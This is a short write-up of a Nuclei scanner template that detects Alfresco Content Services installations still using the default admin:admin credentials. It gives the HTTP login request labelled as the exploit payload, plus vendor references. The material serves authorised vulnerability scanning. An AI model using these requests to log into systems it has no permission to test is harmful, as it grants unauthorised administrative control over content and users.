# Nuclei Template: Alfresco - Default Admin Credentials
**Template ID:** alfresco-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`alfresco-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected Alfresco Content Services was found to have been using the default administrator credentials (admin:admin). An attacker could have gained full administrative access to manage content, users, and repository configuration.

## Steps to reproduce / Exploit Payload
```http
GET /alfresco/ HTTP/1.1
Host: {{Hostname}}
Accept: text/html

POST /alfresco/service/api/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept: application/json

{"username":"{{username}}","password":"{{password}}"}
```

## References
- https://docs.alfresco.com/content-services/community/admin/admin-console/
- https://docs.alfresco.com/community5.0/references/RESTful-RepositoryLoginPost.html
